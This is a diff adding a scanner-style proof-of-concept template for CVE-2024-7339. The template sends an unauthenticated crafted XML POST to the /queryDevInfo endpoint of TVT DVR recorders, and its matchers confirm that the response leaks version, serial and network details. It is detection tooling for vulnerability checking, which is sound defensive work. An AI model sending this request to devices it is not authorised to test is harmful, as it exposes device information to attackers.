@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "TVT DVR 系列网络硬盘录像机 /queryDevInfo 接口未授权信息泄露验证，通过发送特制 XML POST 请求可获取设备软硬件版本、序列号及网络配置参数"
+id = "POC-AVE-2024-0031"
+name = "TVT DVR queryDevInfo Information Disclosure PoC"
+severity = "medium"
+tags = ["ave-2024-0031"]
+vuln_id = [
+    "CVE-2024-7339",
+    "AVE-2024-0031",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/queryDevInfo"
+protocol = "http"
+
+[poc.requests.body]
+content = '<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>'
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["softwareVersion"]
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["eth0"]
